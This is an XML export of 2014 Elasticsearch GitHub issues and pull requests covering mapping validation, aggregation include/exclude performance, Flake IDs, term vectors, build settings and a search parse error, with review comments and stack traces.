</description><key id="41699170">7536</key><summary>Putting a mapping with an empty request body throws a NullPointerException</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">dtdesign</reporter><labels><label>adoptme</label><label>bug</label><label>discuss</label><label>low hanging fruit</label><label>v1.4.0.Beta1</label></labels><created>2014-09-02T11:26:33Z</created><updated>2014-09-12T09:51:08Z</updated><resolved>2014-09-05T20:31:01Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="cfontes" created="2014-09-04T05:00:00Z" id="54407712">Could you provide some examples of the messages you used?
</comment><comment author="dtdesign" created="2014-09-05T10:40:04Z" id="54609704">@cfontes The request was `PUT http://127.0.0.1:9200/my_index/_mapping/my_type`, message body had a length of 0.
</comment><comment author="rjernst" created="2014-09-05T20:32:06Z" id="54677585">Found the problem and fixed.  Thanks for the report!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fixes a simple typo.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7535</link><project id="" key="" /><description /><key id="41698876">7535</key><summary>Fixes a simple typo.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">ulir</reporter><labels><label>docs</label></labels><created>2014-09-02T11:22:06Z</created><updated>2014-09-11T09:18:39Z</updated><resolved>2014-09-11T09:18:39Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2014-09-02T12:39:53Z" id="54145033">Thanks @ulir, nice catch!  Can you sign a CLA so I can push this change in?  http://www.elasticsearch.org/contributor-agreement/

Thank you!
</comment><comment author="ulir" created="2014-09-11T07:18:19Z" id="55228539">It was more of a first try, just to get to know the procedure.
I finally submitted the CLA now ...

Thanks,
Uli

2014-09-02 14:40 GMT+02:00 Michael McCandless notifications@github.com:

&gt; Thanks @ulir https://github.com/ulir, nice catch! Can you sign a CLA so
&gt; I can push this change in?
&gt; http://www.elasticsearch.org/contributor-agreement/
&gt; 
&gt; Thank you!
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/elasticsearch/elasticsearch/pull/7535#issuecomment-54145033
&gt; .
</comment><comment author="clintongormley" created="2014-09-11T09:18:16Z" id="55239578">thanks @ulir 

merged!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Better validation of mapping JSON</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7534</link><project id="" key="" /><description>The parsers for the mappers now remove each setting as they parse it and an error will be thrown if any settings are left after parsing is complete

Closes #7205 
</description><key id="41695854">7534</key><summary>Better validation of mapping JSON</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:Mapping</label><label>enhancement</label><label>v2.0.0-beta1</label></labels><created>2014-09-02T10:37:51Z</created><updated>2015-06-07T10:55:11Z</updated><resolved>2014-11-12T15:19:09Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="brwe" created="2014-09-02T12:03:54Z" id="54141698">Was the intention of this to also work for root mappers like `_all`, `_boost` etc? I thought so because you changed AllFieldMapper but the change as is does not help detecting typos in fields of root mappers.
</comment><comment author="brwe" created="2014-09-02T12:49:42Z" id="54146163">For the context suggester, one can still put arbitrary fields into the context, for example:

```
PUT testidx
{
  "mappings": {
    "service": {
      "properties": {
        "suggest_field": {
          "type": "completion",
          "context": {
            "location": {
              "type": "geo",
              "precision": "5m",
              "neighbors": true,
              "default": "u33",
              "foo": "bar"
            }
          }
        }
      }
    }
  }
}
```
</comment><comment author="brwe" created="2014-09-02T12:56:41Z" id="54146961">This does not seem to work work for multi_fields yet, example below.
Maybe we need to check for each field directly after parsing if the mapping that is passed to the parser is empty instead of checking at the very end?

This should throw an exception but does not:

```
PUT testidx
{
  "mappings": {
    "doc": {
      "properties": {
        "text": {
          "type": "string",
          "fields": {
            "another_text": {
              "type": "string",
              "store": true,
              "foo": "bar"
            }
          }
        }
      }
    }
  }
}
```
</comment><comment author="brwe" created="2014-10-17T15:47:11Z" id="59532757">@colings86 I left some comments but I love this change already so much!

One thing I noticed is that if I add a faulty dynamic_mapping, the parser will still not complain:

```
DELETE testidx

DELETE _template/my_template
PUT _template/my_template
{
  "template": "test*",
  "mappings": {
    "_default_": {
      "dynamic_templates": [
        {
          "string_fields": {
            "mapping": {
              "type": "string",
              "foo":"bar"
            },
            "match": "*"
          }
        }
      ]
    }
  }
}
POST testidx/doc/1
{
  "text":1
}

GET _mapping
```

Should we do something about that as well?
</comment><comment author="colings86" created="2014-10-27T13:09:28Z" id="60589437">@brwe I have implemented most of your comments and left some replies on some others. I agree that the dynamic mapping should also be fixed but maybe we should open a new issue for this so that this one can be merged first?
</comment><comment author="clintongormley" created="2014-11-02T12:33:39Z" id="61404929">@colings86 please could you confirm whether this PR would fix #8317?
</comment><comment author="colings86" created="2014-11-03T11:08:37Z" id="61463948">@clintongormley yes this PR will fix #8317 
</comment><comment author="colings86" created="2014-11-04T17:55:49Z" id="61684128">Suggestion from @brwe and @jpountz: Make it so the strict validation is only turned on if the index version is on or after the version that releases this change. This will eliminate the possibility of having a mapping that was created in a previous version that cannot be read by the current version. This is a precaution rather than a necessity
</comment><comment author="clintongormley" created="2014-11-11T19:58:03Z" id="62610347">@brwe and @jpountz - please could you review?
</comment><comment author="jpountz" created="2014-11-11T22:04:33Z" id="62630402">@clintongormley @colings86 As far as I am concerned, I think it's ready, I just left minor notes. There is an issue with fielddata and norms settings, but this PR solves most of the issue so I think we should not try to solve it in this PR and merge soon.
</comment><comment author="brwe" created="2014-11-12T11:05:30Z" id="62702509">agree with @jpountz 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Test: Randomly enable AggressiveOpts in builds</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7533</link><project id="" key="" /><description>to catch JVM bugs earlier I'd love to run builds randomly with `-XX:+AggressiveOpt` 
</description><key id="41683722">7533</key><summary>Test: Randomly enable AggressiveOpts in builds</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>build</label><label>test</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-02T07:56:40Z</created><updated>2015-06-07T11:45:36Z</updated><resolved>2014-09-09T19:59:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-02T07:57:31Z" id="54119921">@mrsolo can you take a look?
</comment><comment author="mrsolo" created="2014-09-02T18:44:14Z" id="54198356">The change exposes the bug in line 293

 s[k] = v.join(' ') #this should be dependent on class of v[0] and perform reduce operation instead... good enough for now.  tests.javm.argline will be quoted if AgressiveOpts isn't picked

tests.jvm.argline: -server -XX:+UseSerialGC -XX:+UseCompressedOops -XX:+AggressiveOpts

tests.jvm.argline: '-server -XX:+UseG1GC -XX:-UseCompressedOops '

changing the line to 

s[k] = v.compact.join(' ') will address the issue
</comment><comment author="s1monw" created="2014-09-03T11:46:52Z" id="54284796">@mrsolo thanks for the review I pushed a new commit
</comment><comment author="mrsolo" created="2014-09-03T15:59:25Z" id="54319465">LGTM.. pushing code change through CI
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Script parse fail</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7532</link><project id="" key="" /><description>I always use "functions":[{"filter":{"exists":{"field":"pd"}},"script_score":{"script":"(0.08 / ((3.16*pow(10,-11)) \* abs(now - doc[bf].date.getMillis()) + 0.05)) + 1.0","params":{"now":1409495389420,"bf":"pd"}}}]}},"fields":"id"}]]  in all queries. But sometime, my ES parse fail. 
I using ES 1.2.x

[2014-08-31 21:29:49,350][DEBUG][action.search.type       ] [conf2] [news][4], node[l_6mZUHVRp6Vke1izjz9OQ], [R], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@5e3ea4f7] lastShard [true]
org.elasticsearch.transport.RemoteTransportException: [conf1][inet[/172.16.10.35:9300]][search/phase/dfs]
Caused by: org.elasticsearch.search.SearchParseException: [news][4]: from[0],size[30]: Parse Failure [Failed to parse source [{"from":0,"size":30,"query":{"function_score":{"query":{"wrapper":{"query":"eyB0ZW1wbGF0ZSA6IHsgcGFyYW1zIDogeyAidGVybSI6IFsiYsOpIiwiYsOqIiwiYuG6o24iLCJi4bqndSIsImLhu6VuZyIsImNoaeG6v24iLCJjaMOibiIsImNow7MiLCJnw6FpIiwiaGFpIiwibOG7mSIsIm1hbmciLCJuaOG6pXQiLCJwaOG7pSIsInNhbyIsInZp4buHdCIsIsSDbiIsIsSRxrDhu51uZyIsIlx1MDAxQnBtZGZiaGFhbnRldmEiLCJhbmgiLCJiYSIsImJpZWJlciIsImJpw6puIiwiYmnhu4d0IiwiYsOsbmgiLCJiw60iLCJiw7pwIiwiYsSDbmciLCJi4bqhaSIsImLhuqV0IiwiYuG7h25oIiwiYuG7jyIsImLhu5FjIiwiYuG7kWkiLCJi4buXbmciLCJi4bubaSIsImMiLCJjYW5hZGEiLCJjYXN0aW5nIiwiY2jDoG5nIiwic2luaCIsIm7hu68iLCJnw6FpIiwidmnhu4d0IiwiYsOpIiwiYuG6p3UiLCJjw7QiLCJ0deG7lWkiLCJsw6BtIiwibeG6t3QiLCJt4bu5IiwiaMOsbmgiLCJnaeG7m2kiLCJ0aOG6qW0iLCJ04buxIiwi4bqjbmgiXSB9LCBxdWVyeTogeyBmaWx0ZXJlZDogeyBmaWx0ZXIgOiB7IGJvb2w6IHsgbXVzdCA6IFt7IHJhbmdlIDogeyAicGQiIDogeyBndCA6ICJub3ctMjVoL2QiIH0gfSB9LCB7IHJhbmdlIDogeyAicGQiIDogeyBndCA6ICJub3ctMjRoIiB9IH0gfV0gfSB9LCBxdWVyeTogeyB0ZXJtcyA6IHsgInQiIDogWyJ7eyN0ZXJtfX0iLCJ7ey59fSIsInt7L3Rlcm19fSJdICwgICJtaW5pbXVtX3Nob3VsZF9tYXRjaCI6IDIgIH0gfSB9IH0gfSB9"}},"functions":[{"filter":{"exists":{"field":"pd"}},"script_score":{"script":"(0.08 / ((3.16*pow(10,-11)) \* abs(now - doc[bf].date.getMillis()) + 0.05)) + 1.0","params":{"now":1409495389420,"bf":"pd"}}}]}},"fields":"id"}]]
        at org.elasticsearch.search.SearchService.parseSource(SearchService.java:649)
        at org.elasticsearch.search.SearchService.createContext(SearchService.java:511)
        at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:483)
        at org.elasticsearch.search.SearchService.executeDfsPhase(SearchService.java:186)
        at org.elasticsearch.search.action.SearchServiceTransportAction$SearchDfsTransportHandler.messageReceived(SearchServiceTransportAction.java:667)
        at org.elasticsearch.search.action.SearchServiceTransportAction$SearchDfsTransportHandler.messageReceived(SearchServiceTransportAction.java:656)
        at org.elasticsearch.transport.netty.MessageChannelHandler$RequestHandler.run(MessageChannelHandler.java:270)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at java.lang.Thread.run(Thread.java:745)
Caused by: org.elasticsearch.index.query.QueryParsingException: [news] Failed to parse
        at org.elasticsearch.index.query.IndexQueryParserService.parse(IndexQueryParserService.java:262)
        at org.elasticsearch.search.query.QueryParseElement.parse(QueryParseElement.java:33)
        at org.elasticsearch.search.SearchService.parseSource(SearchService.java:633)
        ... 9 more
Caused by: org.elasticsearch.common.jackson.core.JsonParseException: Illegal unquoted character ((CTRL-CHAR, code 27)): has to be escaped using backslash to be included in string value
 at [Source: UNKNOWN; line: 1, column: 334]
        at org.elasticsearch.common.jackson.core.JsonParser._constructError(JsonParser.java:1524)
        at org.elasticsearch.common.jackson.core.base.ParserMinimalBase._reportError(ParserMinimalBase.java:557)
        at org.elasticsearch.common.jackson.core.base.ParserMinimalBase._throwUnquotedSpace(ParserMinimalBase.java:518)
        at org.elasticsearch.common.jackson.core.json.UTF8StreamJsonParser._finishString2(UTF8StreamJsonParser.java:2219)
        at org.elasticsearch.common.jackson.core.json.UTF8StreamJsonParser._finishString(UTF8StreamJsonParser.java:2149)
        at org.elasticsearch.common.jackson.core.json.UTF8StreamJsonParser.getTextCharacters(UTF8StreamJsonParser.java:361)
        at org.elasticsearch.common.xcontent.json.JsonXContentParser.bytes(JsonXContentParser.java:91)
        at org.elasticsearch.common.xcontent.json.JsonXContentParser.objectBytes(JsonXContentParser.java:117)
        at org.elasticsearch.index.query.TermsQueryParser.parse(TermsQueryParser.java:81)
        at org.elasticsearch.index.query.QueryParseContext.parseInnerQuery(QueryParseContext.java:227)
        at org.elasticsearch.index.query.FilteredQueryParser.parse(FilteredQueryParser.java:71)
        at org.elasticsearch.index.query.QueryParseContext.parseInnerQuery(QueryParseContext.java:227)
        at org.elasticsearch.index.query.TemplateQueryParser.parse(TemplateQueryParser.java:76)
        at org.elasticsearch.index.query.QueryParseContext.parseInnerQuery(QueryParseContext.java:227)
        at org.elasticsearch.index.query.WrapperQueryParser.parse(WrapperQueryParser.java:63)
        at org.elasticsearch.index.query.QueryParseContext.parseInnerQuery(QueryParseContext.java:227)
        at org.elasticsearch.index.query.functionscore.FunctionScoreQueryParser.parse(FunctionScoreQueryParser.java:100)
        at org.elasticsearch.index.query.QueryParseContext.parseInnerQuery(QueryParseContext.java:227)
        at org.elasticsearch.index.query.IndexQueryParserService.parse(IndexQueryParserService.java:334)
        at org.elasticsearch.index.query.IndexQueryParserService.parse(IndexQueryParserService.java:260)
        ... 11 more
</description><key id="41670539">7532</key><summary>Script parse fail</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">letrungtrung</reporter><labels /><created>2014-09-02T02:25:47Z</created><updated>2014-09-02T05:54:44Z</updated><resolved>2014-09-02T05:54:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-09-02T05:54:44Z" id="54112145">As written in logs, your script has a special character.

```
Caused by: org.elasticsearch.common.jackson.core.JsonParseException: Illegal unquoted character ((CTRL-CHAR, code 27)): has to be escaped using backslash to be included in string value
```

at [Source: UNKNOWN; line: 1, column: 334]

BTW, please use the mailing list for questions. We keep this space for issues and feature requests.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Switch auto-generated IDs to Flake IDs from random UUIDs</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7531</link><project id="" key="" /><description>Flake IDs give better lookup performance in Lucene since they share
predictable prefixes (timestamp).

Closes #5941

This PR starts from @GaelTadh's original PR (#6004) and just folds in the last round of feedback ... I think it's ready?
</description><key id="41654195">7531</key><summary>Switch auto-generated IDs to Flake IDs from random UUIDs</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mikemccand</reporter><labels><label>:Core</label><label>feature</label><label>release highlight</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-01T17:38:31Z</created><updated>2015-06-06T18:20:06Z</updated><resolved>2014-09-02T13:12:57Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="pickypg" created="2014-09-01T19:07:35Z" id="54085907">@mikemccand LGTM. Just minor fluff.
</comment><comment author="mikemccand" created="2014-09-01T20:25:28Z" id="54089699">Thanks @pickpg I pushed a new commit...
</comment><comment author="mikemccand" created="2014-09-02T09:45:27Z" id="54129606">Thanks @jpount, I pushed a new commit folding in your feedback...
</comment><comment author="jpountz" created="2014-09-02T10:07:09Z" id="54131996">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Support for artificial documents</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7530</link><project id="" key="" /><description>This adds the ability to the Term Vector API to generate term vectors for
artifical documents, that is for documents not present in the index. Following
a similar syntax to the Percolator API, a new 'doc' parameter is used, instead
of '_id', that specifies the document of interest. The parameters '_index' and
'_type' determine the mapping and therefore analyzers to apply to each value
field.
</description><key id="41653892">7530</key><summary>Support for artificial documents</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">alexksikes</reporter><labels><label>:Term Vectors</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-01T17:30:58Z</created><updated>2015-06-07T10:36:53Z</updated><resolved>2014-09-05T05:54:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-09-03T16:15:12Z" id="54321916">@alexksikes I left some comments
</comment><comment author="alexksikes" created="2014-09-03T17:11:12Z" id="54331110">@jpountz Thanks for comments. We should decide on allowing dynamic mappings or not, and if not what would be the easiest way to implement it? I'd be in favor of disabling dynamic mapping and only returning the TVs from the fields found in the original mapping. That because there is just too much room for mistakes and unintended behaviors. Maybe @clintongormley has some ideas?
</comment><comment author="jpountz" created="2014-09-04T15:28:18Z" id="54494761">I left some comments but I think it is close
</comment><comment author="jpountz" created="2014-09-04T23:23:58Z" id="54559351">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Aggs enhancement - allow Include/Exclude clauses to use array of terms</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7529</link><project id="" key="" /><description>This is provided as an alternative means to filtering with a regex string.
Using this approach clients no longer need to escape terms provided in the query DSL. 

Closes #6782
</description><key id="41646494">7529</key><summary>Aggs enhancement - allow Include/Exclude clauses to use array of terms</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">markharwood</reporter><labels><label>enhancement</label><label>v1.5.0</label></labels><created>2014-09-01T15:19:00Z</created><updated>2015-04-18T19:57:01Z</updated><resolved>2014-09-12T15:44:43Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-09-01T21:13:37Z" id="54092030">The change looks good to me overall. I think you just missed to add this new API to `TermsBuilder`? Let's also add basic tests for this functionality?
</comment><comment author="markharwood" created="2014-09-02T08:51:22Z" id="54124446">Thanks for the review. Will make suggested changes
</comment><comment author="markharwood" created="2014-09-09T14:25:48Z" id="54976643">@jpountz Any chance of another review on this? I've got a big performance improvement blocked on this feature (150ms vs 74 seconds for a query)
</comment><comment author="markharwood" created="2014-09-09T15:38:35Z" id="54988819">Bundled the optimisation for non-regex terms referenced in https://github.com/elasticsearch/elasticsearch/issues/7526 as part of this PR
</comment><comment author="markharwood" created="2014-09-12T09:36:42Z" id="55380958">Rebased - good to go on this? Fixes a nasty performance issue.
</comment><comment author="jpountz" created="2014-09-12T10:45:47Z" id="55387446">LGTM
</comment><comment author="jpountz" created="2014-09-12T10:48:39Z" id="55387681">In the future I'm wondering that it might be cleaner to switch this to Lucene's logic to intersect terms enums with automatons (there is already existing logic to translate a regexp to an automaton).
</comment><comment author="markharwood" created="2014-09-12T10:58:05Z" id="55388431">Thanks for the review, Adrien! Will patch and push to master and 1.x.

&gt; I'm wondering that it might be cleaner to switch this to Lucene's logic to intersect terms enums with automatons.

Agreed there is scope for future work here. IncludeExclude feels weird having both regex and straight-match logic in a single class right now but introducing pluggable term filtering impls feels like a bigger change. There's still a big cost in using regexes on high-cardinality fields (it iterates ALL terms) and this is not caught by existing timeout logic (but is by https://github.com/elasticsearch/elasticsearch/pull/4586 which is also something we need to decide on).
</comment><comment author="jpountz" created="2014-09-12T11:00:19Z" id="55388594">&gt; There's still a big cost in using regexes on high-cardinality fields (it iterates ALL terms)

Agreed, that is where I hope Lucene's automaton-based intersection would help since it would allow to not evaluate the regexp on every term (it takes advantage of the structure of the automaton and of the fact that the terms are sorted to rapidly skip over non-matching terms).
</comment><comment author="markharwood" created="2014-09-12T15:44:43Z" id="55421299">Committed as https://github.com/elasticsearch/elasticsearch/commit/3c8f8cc09054a6c62c5d8eef529d3f662b887344
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add exact-match (ie non-regex) terms to agg Include/Exclude clauses</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7528</link><project id="" key="" /><description>The include/exclude clause used in aggregations like _terms_ agg uses regex syntax to identify terms.
While this offers a lot of flexibility for matching, the list of terms supplied by a user is sometimes a fixed set of raw values and it is:
a) inconvenient for the user to have to escape these strings into "legal" regex patterns and
b) inefficient to parse and interpret these as regex patterns when a simple hashset would suffice

The proposed change is the addition of a "values" array to both _include_ and _exclude_  clauses:

```
"terms" : {
    "field" : "domains.raw", 
    "include" : {
        "values":  [ "http://www.foo.com", "http://www.bar.com"]
    }
}
```

This can be used in conjunction or instead of the existing "pattern" clause in a search. If an include or exclude statement contains a mix of regex ("pattern") and exact ("values") clauses then this would be a logical OR - a match on the regex clause OR the exact value clause would constitute a match.

@clintongormley you may have some input on this?
</description><key id="41627536">7528</key><summary>Add exact-match (ie non-regex) terms to agg Include/Exclude clauses</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/markharwood/following{/other_user}', u'events_url': u'https://api.github.com/users/markharwood/events{/privacy}', u'organizations_url': u'https://api.github.com/users/markharwood/orgs', u'url': u'https://api.github.com/users/markharwood', u'gists_url': u'https://api.github.com/users/markharwood/gists{/gist_id}', u'html_url': u'https://github.com/markharwood', u'subscriptions_url': u'https://api.github.com/users/markharwood/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/170925?v=4', u'repos_url': u'https://api.github.com/users/markharwood/repos', u'received_events_url': u'https://api.github.com/users/markharwood/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/markharwood/starred{/owner}{/repo}', u'site_admin': False, u'login': u'markharwood', u'type': u'User', u'id': 170925, u'followers_url': u'https://api.github.com/users/markharwood/followers'}</assignee><reporter username="">markharwood</reporter><labels /><created>2014-09-01T10:57:16Z</created><updated>2014-09-01T12:20:25Z</updated><resolved>2014-09-01T12:20:25Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-09-01T11:16:41Z" id="54048026">@markharwood Is it a duplicate of https://github.com/elasticsearch/elasticsearch/issues/6782 ?
</comment><comment author="markharwood" created="2014-09-01T12:20:25Z" id="54053016">Yes - same problem (don't need/want regex), slightly different solution.
I'll drop this issue and change the code I was working on to use the syntax shown in 6782.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>max_file_descriptors is reported as -1</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7527</link><project id="" key="" /><description>I recently changed the maximum open file limit on my machine from 5,000 to 32,000. I did this by adding the following lines to `/etc/security/limits.conf`:

```
logstash    soft    nofile  32000
logstash    hard    nofile  32000
```

If I switch to this user, I do indeed get these limits:

```
$ ulimit -Sn
32000
$ ulimit -Hn
32000
```

However, after restarting the elasticsearch process, http://localhost:9200/_nodes?os=true&amp;process=true&amp;pretty=true displays the following:

```
      "process" : {
        "refresh_interval" : 1000,
        "id" : 27218,
        "max_file_descriptors" : -1,
        "mlockall" : false
      },
```

Should I be concerned? How can the maximum number be negative?
</description><key id="41626826">7527</key><summary>max_file_descriptors is reported as -1</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">Wilfred</reporter><labels><label>discuss</label></labels><created>2014-09-01T10:45:35Z</created><updated>2015-09-28T10:28:40Z</updated><resolved>2015-09-28T09:54:14Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T14:21:32Z" id="54713547">Hi @Wilfred 

What version of ES are you using, and what OS and JVM are you running on?  -1 indicates that it couldn't read the value.
</comment><comment author="Wilfred" created="2014-09-08T13:47:17Z" id="54819247">I'm using ES 1.1.1 on a RHEL 5.5 box with JVM version 1.7.0_40.
</comment><comment author="styfle" created="2015-09-26T01:22:38Z" id="143388740">I see `"max_file_descriptors" : -1` running the following:

Windows Server 2012
Elasticsearch-1.7.2
Java 1.8.0_60-b27

Is this a problem?
</comment><comment author="clintongormley" created="2015-09-27T09:58:28Z" id="143534207">@styfle no, it just means that we were unable to retrieve that value on windows.

@tlrx do you know if max_file_descriptors works on windows in 2.0?
</comment><comment author="tlrx" created="2015-09-28T09:08:47Z" id="143685583">open/maximum files descriptors are not supported on Windows platforms, elasticsearch 2.0 will always return `-1`.
</comment><comment author="clintongormley" created="2015-09-28T09:54:14Z" id="143697226">thanks @tlrx 

closing
</comment><comment author="Wilfred" created="2015-09-28T10:19:29Z" id="143701468">&gt; it just means that we were unable to retrieve that value

Is this documented anywhere? I was initially concerned when ES reported -1.
</comment><comment author="tlrx" created="2015-09-28T10:28:40Z" id="143702827">It is documented for 2.0 (see https://www.elastic.co/guide/en/elasticsearch/reference/master/cluster-nodes-stats.html#process-stats) but it is not documented for previous versions.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Performance - include/exclude terms on high cardinality fields</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7526</link><project id="" key="" /><description>I have noticed that if you add an "include" or "exclude" section as part of a _terms_ or _significant_terms_ aggregation on a high-cardinality field the performance can degrade quite badly.

The root cause is that the IncludeExclude.acceptedGlobalOrdinals() method enumerates terms eagerly for all terms in the index rather than lazily for those in the result set. For a high cardinality field this can take a very long time (tens of seconds in my test). As the method name suggests, this code is run when global ordinals are used and so a work-around is for the client to use

```
"execution_hint" : "map"
```

to their agg definition to avoid the use of global ordinals. In my tests this reduced a query that took 30 seconds down to sub-second but obviously there may be memory concerns relating to not using global ordinals.

This issue is created to discuss the ways in which we could automatically "do the right thing" without users needing to provide execution hints or incurring other costs.
</description><key id="41625753">7526</key><summary>Performance - include/exclude terms on high cardinality fields</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">markharwood</reporter><labels><label>:Aggregations</label><label>adoptme</label><label>enhancement</label><label>high hanging fruit</label><label>v2.0.0-beta1</label></labels><created>2014-09-01T10:30:14Z</created><updated>2015-04-09T10:16:37Z</updated><resolved>2015-04-09T10:16:37Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-09-09T07:54:18Z" id="54936139">@markharwood Yes, using include/exclude is slow since it will iterate over all terms and for each term check if it matches with the provided includes and doesn't match with the provided exclude. Each terms that is accepted the global ordinal will be saved in a bitset. The idea here was to be potentially slower (which really is the case for high cardinality fields) rather than increasing the transient memory footprint of a search request with a terms aggregation. 

I think we can optimize this logic in certain scenarios. For example if include with without regex expression is used or a simple include prefix is used we can iterator over all includes and lookup the global ordinal instead of iterating over all possible terms and check if they match with the defined include terms. I think the same can be done for exclude terms without regex and prefixes. Would this help in your tests?

And maybe then if include/exclude terms are used with regex we should then fallback to the map execution hint? Similar to what happens if terms aggregation with script is executed.
</comment><comment author="markharwood" created="2014-09-09T12:13:55Z" id="54960032">Thanks for the comment, @martijnvg My use case is when looking at the interactions of a pre-defined set of entities e.g. all the actors who have appeared in "mafia" movies or all the people in Enron who participated in emails referencing "LJM". This is likely to be a common form of analysis as it provides us with the raw data required to conduct graph analytics (centrality measures, key influencers, initiators etc)
